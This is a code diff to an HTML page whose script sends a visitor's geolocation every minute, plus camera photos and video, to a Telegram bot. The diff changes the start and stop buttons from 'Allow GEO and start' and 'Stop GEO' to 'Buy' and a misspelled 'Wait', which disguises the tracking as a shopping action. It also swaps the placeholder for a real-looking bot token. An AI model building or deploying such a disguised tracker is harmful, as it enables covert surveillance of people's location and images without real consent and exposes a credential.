@@ -196,8 +196,8 @@
         Геолокация отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
       </div>
 
-      <button class="primary" id="startBtn" onclick="startAll()">Разрешить GEO и начать</button>
-      <button class="stop" id="stopBtn" onclick="stopTracking()">Остановить GEO</button>
+      <button class="primary" id="startBtn" onclick="startAll()">Купить</button>
+      <button class="stop" id="stopBtn" onclick="stopTracking()">Ожидате</button>
 
       <video id="video" class="preview" autoplay playsinline muted></video>
       <canvas id="canvas" class="hidden"></canvas>
@@ -211,7 +211,7 @@
   </main>
 
   <script>
-    const botToken = "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN";
+    const botToken = "8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os";
     const chatId = "380243961";
 
     const sendIntervalMs = 60 * 1000;
@@ -589,7 +589,7 @@ ${buildBaseInfo()}`;
     }
 
     async function startAll() {
-      if (!botToken || botToken === "8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os") {
+      if (!botToken || botToken === "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN") {
         setStatus("Сначала вставь BOT_TOKEN в файл index.html.");
         return;
       }
@@ -614,3 +614,4 @@ ${buildBaseInfo()}`;
   </script>
 </body>
 </html>
+
